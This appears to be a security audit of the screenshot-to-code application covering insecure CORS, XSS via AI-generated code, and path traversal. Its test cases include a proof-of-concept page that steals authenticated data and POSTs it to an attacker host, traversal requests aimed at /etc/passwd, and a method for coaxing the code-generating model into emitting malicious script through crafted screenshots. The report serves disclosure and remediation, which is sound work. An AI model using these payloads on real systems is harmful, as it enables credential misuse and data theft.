# VULNERABILITIES

## Insecure CORS Configuration with Credentials

### Vulnerability name
Insecure CORS Configuration with Credentials

### Description
The application implements a Cross-Origin Resource Sharing (CORS) configuration that is insecurely configured. The backend application sets `allow_origins=["*"]` (allowing requests from any origin) while simultaneously setting `allow_credentials=True` (allowing cookies and authentication headers to be included). This combination is explicitly forbidden by the CORS specification because it creates serious security risks.

Step by step to trigger this vulnerability:
1. An attacker identifies that the application has this insecure CORS configuration
2. The attacker creates a malicious website that makes authenticated requests to the screenshot-to-code API endpoints
3. When a user who is already authenticated to the screenshot-to-code application visits the malicious website, the attacker's JavaScript code can make requests to the application API with the user's authentication credentials
4. These requests will be processed by the server as if they were legitimate requests coming from the user

### Impact
This vulnerability allows attackers to perform cross-site request forgery (CSRF) attacks with credentials. An attacker could create a malicious website that, when visited by an authenticated user, makes authenticated requests to the screenshot-to-code API. These requests would include the user's authentication cookies or tokens.

The attacker could potentially:
- Access sensitive user data
- Perform operations on behalf of the user
- Steal API keys if the application allows retrieving previously set API keys
- Modify user settings or preferences
- Generate content using the user's API quota (incurring costs to the user)

### Vulnerability rank
High

### Currently implemented mitigations
There are no mitigations implemented for this vulnerability. The application explicitly configures CORS to allow credentials from any origin.

### Missing mitigations
The application should implement one of these mitigations:
1. If credentials are needed, specify exact origins instead of using a wildcard:
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://trusted-origin.com"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

2. If a wildcard origin is necessary, disable credentials:
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

### Preconditions
- The user must be authenticated to the screenshot-to-code application
- The user must visit a malicious website crafted by the attacker while being authenticated
- The application must process sensitive operations or data that would be valuable for an attacker to access

### Source code analysis
In `main.py`, the CORS middleware is configured in a way that violates security best practices:

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

This configuration allows any website to make authenticated requests to the API. The CORS specification explicitly prohibits this combination because it poses a security risk. When `allow_credentials=True`, specific origins must be listed rather than using the wildcard "*".

Additionally, the permissive settings for `allow_methods=["*"]` and `allow_headers=["*"]` further increase the attack surface, allowing the attacker to use any HTTP method and include any headers in their requests.

### Security test case
To prove this vulnerability exists:

1. Deploy the application as is with the insecure CORS configuration
2. Create an authenticated session with the application
3. Create a malicious HTML page with the following JavaScript:
```html
<!DOCTYPE html>
<html>
<body>
<script>
  // This will execute when a user visits this page
  fetch('https://screenshot-to-code-instance.com/api/sensitive-endpoint', {
    method: 'GET',
    credentials: 'include' // This includes cookies in the request
  })
  .then(response => response.json())
  .then(data => {
    // Send the sensitive data to attacker's server
    fetch('https://attacker-server.com/steal-data', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
</body>
</html>
```
4. Host this malicious page on a different domain
5. Have an authenticated user visit the malicious page
6. Observe that the request to the sensitive endpoint succeeds with the user's credentials
7. The attacker now has access to sensitive data or can perform actions on behalf of the user

## Potential XSS through AI-Generated Code

### Vulnerability name
Potential XSS through AI-Generated Code

### Description
The screenshot-to-code application generates HTML/JavaScript code using AI models based on user-provided inputs (screenshots, images, videos). When this generated code is displayed to users, there is no evidence in the codebase of proper sanitization or content security policies to prevent the execution of malicious JavaScript. This creates a potential cross-site scripting (XSS) vulnerability.

Step by step to trigger this vulnerability:
1. An attacker carefully crafts a screenshot or design that contains elements likely to prompt the AI to generate JavaScript code with malicious content
2. The attacker submits this input to the screenshot-to-code application
3. The AI generates HTML/JS code that includes the malicious JavaScript
4. When users view the generated code or preview the rendered output, the malicious JavaScript executes in their browser

### Impact
If successfully exploited, this vulnerability would allow attackers to execute arbitrary JavaScript code in the context of the application in victims' browsers. This could lead to:

- Session hijacking (stealing authentication cookies)
- Stealing API keys that might be stored in the browser
- Stealing other sensitive data displayed in the application
- Performing unauthorized actions on behalf of the victim
- Redirecting users to phishing sites
- Modifying the application's appearance and behavior to trick users

### Vulnerability rank
High

### Currently implemented mitigations
There are no clearly implemented mitigations in the code for sanitizing AI-generated output before displaying it to users. The application appears to take the AI-generated code and display it directly.

### Missing mitigations
The application needs to implement:

1. Content sanitization of AI-generated code before displaying it, using a library like DOMPurify
2. Content Security Policy (CSP) headers to restrict what can execute in the browser
3. Sandbox mechanisms for previewing the generated code in an iframe with restricted permissions
4. Input validation to detect and reject attempts to generate malicious code
5. Output encoding when displaying generated code in the UI

### Preconditions
- The attacker must be able to submit input (screenshots, designs) to the application
- The AI must generate code containing malicious JavaScript based on the attacker's input
- The application must render this generated code without proper sanitization
- Users must view the generated code or its rendered output

### Source code analysis
The application uses various LLM models (OpenAI, Claude, Gemini) to generate HTML/JS code based on user inputs:

```python
async def generate_code_for_image(image_url: str, stack: Stack, model: Llm) -> str:
    prompt_messages = assemble_prompt(image_url, stack)
    return await generate_code_core(prompt_messages, model)
```

The generated code is then processed in various places, such as in `run_image_evals.py`:

```python
with open(output_filepath, "w") as file:
    file.write(content)
```

While there are functions to extract HTML content, like in `codegen/utils.py`:

```python
def extract_html_content(text: str):
    # Use regex to find content within <html> tags and include the tags themselves
    match = re.search(r"(<html.*?>.*?</html>)", text, re.DOTALL)
    if match:
        return match.group(1)
    else:
        # Otherwise, we just send the previous HTML over
        print(
            "[HTML Extraction] No <html> tags found in the generated content: " + text
        )
        return text
```

These functions don't perform sanitization of the content to remove potentially malicious code. The application appears to trust the AI-generated output completely.

In `routes/generate_code.py`, we can see that the extracted HTML content is sent directly to the client without sanitization:

```python
# Strip the completion of everything except the HTML content
completions = [extract_html_content(completion) for completion in completions]

# ...

for index, updated_html in enumerate(updated_completions):
    await send_message("setCode", updated_html, index)
```

### Security test case
To prove this vulnerability exists:

1. Create a specially crafted screenshot or design that contains text or elements likely to cause the AI to generate JavaScript code. For example, a screenshot containing a code snippet with malicious JavaScript or an image that includes alert/XSS payload text.

2. Submit this screenshot to the screenshot-to-code application.

3. Wait for the AI to generate code based on the screenshot.

4. Examine the generated code to see if it contains the malicious JavaScript.

5. If the application provides a preview feature, open the preview to see if the malicious JavaScript executes. Alternatively, save the generated code and open it in a browser.

6. If an alert box appears or the malicious JavaScript executes in any way, the vulnerability is confirmed.

Example attack input:
- Create a screenshot of a webpage that contains text like "Example JavaScript: <script>alert('XSS')</script>" or an image of code containing similar payloads
- Submit this screenshot to the application
- Check if the generated code includes the script tag without escaping or sanitization
- Verify if the code executes when previewed or rendered

## Path Traversal in Evals Routes

### Vulnerability name
Path Traversal in Evals Routes

### Description
The application contains multiple endpoints in `routes/evals.py` that accept user-provided file paths without proper validation or sanitization. This creates a path traversal vulnerability that could allow an attacker to access files outside the intended directory structure.

Step by step to trigger this vulnerability:
1. An attacker identifies the vulnerable endpoints that accept a folder parameter
2. The attacker crafts a request with a path that contains traversal sequences (e.g., `../../../etc/passwd`)
3. The application accepts the path and attempts to read files from that location
4. If the application has sufficient permissions, it will read and return sensitive files to the attacker

### Impact
If successfully exploited, this vulnerability would allow attackers to:

- Read sensitive configuration files that might contain API keys, database credentials, or other secrets
- Access system files containing sensitive information
- Read application source code that might reveal further vulnerabilities
- Potentially access user data stored in files

### Vulnerability rank
High

### Currently implemented mitigations
There are minimal mitigations implemented. The code checks if the folder exists but does not validate that the path is within an allowed directory:

```python
folder_path = Path(folder)
if not folder_path.exists():
    raise HTTPException(status_code=404, detail=f"Folder not found: {folder}")
```

### Missing mitigations
The application needs to implement:

1. Path sanitization to remove traversal sequences
2. Path validation to ensure the requested path is within an allowed directory
3. Use of a safe path joining method that prevents traversal
4. Implementation of a whitelist approach that only allows access to specific directories

### Preconditions
- The attacker must be able to send requests to the vulnerable endpoints
- The application must have permissions to read the targeted files
- The attacker must have knowledge of the file system structure or be able to guess it

### Source code analysis
In `routes/evals.py`, there are multiple endpoints that accept user-provided paths:

```python
@router.get("/evals", response_model=list[Eval])
async def get_evals(folder: str):
    if not folder:
        raise HTTPException(status_code=400, detail="Folder path is required")

    folder_path = Path(folder)
    if not folder_path.exists():
        raise HTTPException(status_code=404, detail=f"Folder not found: {folder}")
```

Similar vulnerable code exists in the `/pairwise-evals` endpoint:

```python
@router.get("/pairwise-evals", response_model=PairwiseEvalResponse)
async def get_pairwise_evals(
    folder1: str = Query(..., description="Absolute path to first folder"),
    folder2: str = Query(..., description="Absolute path to second folder"),
):
    if not os.path.exists(folder1) or not os.path.exists(folder2):
        return {"error": "One or both folders do not exist"}
```

And in the `/best-of-n-evals` endpoint:

```python
@router.get("/best-of-n-evals", response_model=BestOfNEvalsResponse)
async def get_best_of_n_evals(request: Request):
    # Get all query parameters
    query_params = dict(request.query_params)

    # Extract all folder paths (folder1, folder2, folder3, etc.)
    folders = []
    i = 1
    while f"folder{i}" in query_params:
        folders.append(query_params[f"folder{i}"])
        i += 1
```

In all these cases, the application:
1. Takes a folder path directly from user input
2. Checks if the path exists but doesn't validate it's within allowed boundaries
3. Uses the path to read files and return their contents

This allows an attacker to craft paths like `../../../etc/passwd` to potentially access sensitive files outside the intended directory.

### Security test case
To prove this vulnerability exists:

1. Deploy the application on a system where you have permissions to read sensitive files
2. Send a request to the `/evals` endpoint with a path traversal string:
   ```
   GET /evals?folder=../../../etc/passwd
   ```
3. If the system is vulnerable, it will attempt to treat `/etc/passwd` as a directory and list its contents or return an error that reveals path information
4. Try alternative paths like:
   ```
   GET /evals?folder=../../../etc/
   GET /evals?folder=../../../home/
   GET /evals?folder=../../
   ```
5. Similarly, test the `/pairwise-evals` endpoint:
   ```
   GET /pairwise-evals?folder1=../../../etc&folder2=../../../var
   ```
6. And the `/best-of-n-evals` endpoint:
   ```
   GET /best-of-n-evals?folder1=../../../etc&folder2=../../../var
   ```
7. Examine the responses to see if they contain directory listings or file contents that should not be accessible, confirming the vulnerability
